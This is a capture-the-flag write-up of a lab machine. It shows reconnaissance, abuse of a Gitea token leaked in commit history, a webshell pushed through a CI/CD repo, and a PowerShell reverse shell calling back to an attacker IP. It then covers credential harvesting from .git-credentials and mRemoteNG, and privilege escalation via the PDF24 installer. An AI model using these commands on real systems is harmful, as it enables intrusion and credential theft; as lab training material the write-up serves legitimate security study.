# Lock: Easy

```sh
sudo vim /etc/hosts
# add lock.htb

nmap -T4 -p- -A -Pn -v lock.htb
```

* open ports & services:

    * 80/tcp: http: Microsoft IIS httpd 10.0
    * 445/tcp: microsoft-ds?
    * 3000/tcp: ppp?
    * 3389/tcp: ms-wbt-server: Microsoft Terminal Services

* checking the webpage on port 80, we have a website about a PDF conversion tool; there are no links on the website

* web scan:

    ```sh
    feroxbuster -u http://lock.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,md,js,ps1 --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    # dir scan

    ffuf -c -u 'http://lock.htb' -H 'Host: FUZZ.lock.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fw 3024 -s
    # subdomain scan
    ```

* enumerating SMB:

    ```sh
    smbclient -N -L //lock.htb
    # NT_STATUS_ACCESS_DENIED

    smbmap -H lock.htb
    # authentication error

    enum4linux-ng lock.htb -A

    crackmapexec smb lock.htb --shares -u '' -p ''
    # STATUS_ACCESS_DENIED

    crackmapexec smb lock.htb --shares -u 'Guest' -p ''
    # STATUS_ACCOUNT_DISABLED
    ```

* checking the webpage on port 3000, we have the landing page for Gitea; the footer shows it is running version 1.21.3

* the Gitea homepage has links to sign in, explore and help; there is no option to register a new account

* clicking on explore leads to 'http://lock.htb:3000/explore/repos', and we have a repository 'dev-scripts' by the user 'ellen.freeman'

* exploring the users shows only 2 users: 'ellen.freeman' and 'Administrator'

* checking the repo at 'http://lock.htb:3000/ellen.freeman/dev-scripts', it has 2 commits and 1 branch

* we can check it further by downloading the repo:

    ```sh
    git clone http://lock.htb:3000/ellen.freeman/dev-scripts.git

    cd dev-scripts

    ls -la
    # there is a single file 'repos.py'

    less repos.py
    ```

    ```py
    import requests
    import sys
    import os

    def format_domain(domain):
        if not domain.startswith(('http://', 'https://')):
            domain = 'https://' + domain
        return domain

    def get_repositories(token, domain):
        headers = {
            'Authorization': f'token {token}'
        }
        url = f'{domain}/api/v1/user/repos'
        response = requests.get(url, headers=headers)

        if response.status_code == 200:
            return response.json()
        else:
            raise Exception(f'Failed to retrieve repositories: {response.status_code}')

    def main():
        if len(sys.argv) < 2:
            print("Usage: python script.py <gitea_domain>")
            sys.exit(1)

        gitea_domain = format_domain(sys.argv[1])

        personal_access_token = os.getenv('GITEA_ACCESS_TOKEN')
        if not personal_access_token:
            print("Error: GITEA_ACCESS_TOKEN environment variable not set.")
            sys.exit(1)

        try:
            repos = get_repositories(personal_access_token, gitea_domain)
            print("Repositories:")
            for repo in repos:
                print(f"- {repo['full_name']}")
        except Exception as e:
            print(f"Error: {e}")

    if __name__ == "__main__":
        main()
    ```

* checking the Python script, it seems to be a script to fetch repositories from the Gitea instance using an authorization token; no secrets are disclosed in the code

* we can check the commit history to see if there were any secrets committed previously:

    ```sh
    git log
    # check both commits

    git show dcc869b175a47ff2a2b8171cda55cb82dbddff3d

    git show 8b78e6c3024416bce55926faa3f65421a25d6370
    ```

* the first commit shows that a personal access token '43ce39bb0bd6bc489284f2905f033ca467a6362f' was included in the script: and it was removed in the next commit

* now, we can try to use this exposed token with the script to fetch the repositories: the script checks the environment variable 'GITEA_ACCESS_TOKEN' for the token value so we can set that first:

    ```sh
    export GITEA_ACCESS_TOKEN="43ce39bb0bd6bc489284f2905f033ca467a6362f"

    python3 repos.py http://lock.htb:3000
    ```

* running the script shows the user 'ellen.freeman' has one more repository 'website'

* to fetch the repository contents, we can extend the functionality of the given script: currently it just does a call to the Gitea API endpoint '/api/v1/user/repos', so we can try fetching the repo similarly

* Googling for Gitea API and cloning a repository shows that we can use the personal access token as the username when cloning the repo

* we can try to clone the 'website' repo: the link 'http://lock.htb:3000/ellen.freeman/website.git' can be used (similar to cloning the 'dev-scripts' repo):

    ```sh
    git clone http://lock.htb:3000/ellen.freeman/website.git
    # this asks for username and password
    # we can use the Gitea token as username, and password as empty
    # this works
    ```

* the 'website' repo is cloned successfully using the personal access token, and now we can check the repo for any secrets:

    ```sh
    cd website

    ls -la
    # check all files

    less readme.md

    less index.html

    ls -la assets
    ```

* the ```readme.md``` file mentions CI/CD integration is active, and any changes to the repo will be deployed to the webserver automatically

* the ```index.html``` file confirms that it is the same webpage as the one on port 80; the 'assets' folder does not contain any useful info

* we can check the commit history for any clues:

    ```sh
    git log
    # shows 5 commits

    git show 657a342b7a68f195f421c5750b837dfa390ea6c1
    # check all commits using the commit hash
    ```

* the commit history shows the emails 'ellen.freeman@oplock.vl' and 'ellen@lock.vl'; the committed code itself does not give any clues

* as the readme file mentions that any changes made to the repo will be reflected on the webpage, we can try creating a reverse shell file in the repository, and push the changes to the repo: such that we can access the revshell on the webpage:

    * the webpage on port 80 is using ASP.NET framework and running on IIS web server, according to the ```wappalyzer``` extension

    * so we can copy a ASPX revshell file into the directory and commit the changes upstream:

        ```sh
        cp /usr/share/webshells/aspx/cmdasp.aspx .
        # copy aspx webshell into website repo

        git status

        git add cmdasp.aspx

        git commit -m "added webshell"
        # this fails with error "author identity unknown"

        git config --global user.email "ellen@lock.vl"
        # set email as user email found earlier

        git config --global user.name "43ce39bb0bd6bc489284f2905f033ca467a6362f"
        # set username as personal access token

        git commit -m "added webshell"
        # this works now

        git push
        # username as token value, and password can be left empty
        ```
    
    * once the changes are pushed, if we navigate to 'http://lock.htb/cmdasp.aspx', we can see the webshell has been uploaded and we can execute the commands

    * to get a reverse shell, we can create the PowerShell encoded revshell payload first:

        ```ps
        pwsh

        $Text = '$client = New-Object System.Net.Sockets.TCPClient("10.10.14.95",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

        $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

        $EncodedText =[Convert]::ToBase64String($Bytes)

        $EncodedText
        # base64-encoded revshell one-liner

        exit
        ```
    
    * now we can set up a listener using ```nc -nvlp 4444```, and execute the command ```powershell -enc <base64-encoded payload>``` in the ASPX webshell: this gives us reverse shell

* in reverse shell:

    ```ps
    whoami
    # lock\ellen.freeman
    
    dir C:\
    # we have a Gitea folder

    dir C:\Gitea
    # check for any sensitive files

    type C:\Gitea\custom\conf\app.ini
    ```

* the config file ```C:\Gitea\custom\conf\app.ini``` mentions the SQLite3 DB file at ```C:\Gitea\data\gitea.db``` - we can check this for any secrets

* we can continue to check for any other secrets before checking the DB file:

    ```ps
    dir C:\Users
    # lists users 'ellen.freeman' and 'gale.dekarios'

    dir C:\Users\ellen.freeman
    # contains non-default files

    type C:\Users\ellen.freeman\.git-credentials
    ```

* the home directory of user 'ellen.freeman' contains a file for Git credentials, which gives us the creds 'ellen.freeman:YWFrWJk9uButLeqx'

* we can try re-using these creds for RDP login:

    ```sh
    xfreerdp /u:ellen.freeman /p:'YWFrWJk9uButLeqx' /v:lock.htb
    # does not work

    xfreerdp /u:gale.dekarios /p:'YWFrWJk9uButLeqx' /v:lock.htb
    # this also does not work
    ```

* we can continue our enumeration:

    ```ps
    gci -recurse -force C:\Users\ellen.freeman
    # this finds a few interesting files

    type C:\Users\ellen.freeman\AppData\Local\automation\Gitea_Webhook.ps1
    # updates the 'website' repo changes

    type C:\Users\ellen.freeman\Desktop\desktop.ini

    type C:\Users\ellen.freeman\Documents\config.xml
    ```

* the file ```C:\Users\ellen.freeman\Documents\config.xml``` contains XML data for mRemoteNG: a RDP connection manager: and it mentions the username 'gale.dekarios'

* the file also includes the encrypted password 'TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=='

* we can use the [mremoteng_decrypt.py script](https://github.com/kmahyyg/mremoteng-decrypt/blob/master/mremoteng_decrypt.py) on the attacker to decrypt the mRemoteNG password:

    ```sh
    python3 mremoteng_decrypt.py -s 'TYkZkvR2YmVlm2T2jBYTEhPU2VafgW1d9NSdDX+hUYwBePQ/2qKx+57IeOROXhJxA7CczQzr1nRm89JulQDWPw=='
    ```

* this cracks the password to give the cleartext 'ty8wnW9qCKDosXo6'

* we can try to login as 'gale.dekarios' now:

    ```sh
    xfreerdp /u:gale.dekarios /p:'ty8wnW9qCKDosXo6' /v:lock.htb /cert:ignore /dynamic-resolution /drive:share,/tmp
    # this works
    ```

* we can get the user flag from the Desktop of 'gale.dekarios'; the desktop also contains shortcuts to non-default tools 'PDF24 Launcher' and 'PDF24 Toolbox'

* launching the 'PDF24 Launcher' gives us the interface with multiple tools: if we click on the About section, it gives us the version 11.15.1

* Googling for exploits associated with PDF24 11.15.1 leads to [CVE-2023-49147: a local privesc via MSI installer in the PDF24 Creator program](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-msi-installer-in-pdf24-creator-geek-software-gmbh/)

* we can follow the exploit instructions given in the blog post:

    * first, launch a CMD prompt and search for the installer MSI file:

        ```cmd
        where /r C:\ pdf24-creator-11.15.1-x64.msi
        ```
    
    * this gives us the location ```C:\_install\pdf24-creator-11.15.1-x64.msi```

    * next, download the [SetOpLock binary](https://github.com/googleprojectzero/symboliclink-testing-tools): we can download the zip file from the Releases

    * extracting the zip file gives us ```SetOpLock.exe``` which can be used in the exploit: this can be transferred to the target machine

    * then, we can start the repair process of PDF24 Creator:

        ```cmd
        msiexec.exe /fa C:\_install\pdf24-creator-11.15.1-x64.msi
        ```
    
    * select the default option and let the PDF24 Creator program run

    * now, we can set the oplock on the target file:

        ```cmd
        cd C:\Users\gale.dekarios\Desktop

        SetOpLock.exe "C:\Program Files\PDF24\faxPrnInst.log" r
        ```
    
    * once the repair program is about to finish, the OpLock gets triggered, and we can see a new CMD prompt opens for ```C:\Program Files\PDF24\pdf24-PrinterInstall.exe```

    * we can now right-click on top of the cmd window > Properties > Options > "Legacyconsolemode" link > open the link with the Firefox browser installed on target (it does not work with Edge or Internet Explorer)

    * in the opened browser window press the shortcut 'Ctrl+o': this launches File Explorer: here type 'cmd.exe' in the top bar and press Enter

    * now we have an elevated command shell:

        ```cmd
        whoami
        # nt authority\system

        type C:\Users\Administrator\Desktop\root.txt
        # root flag
        ```
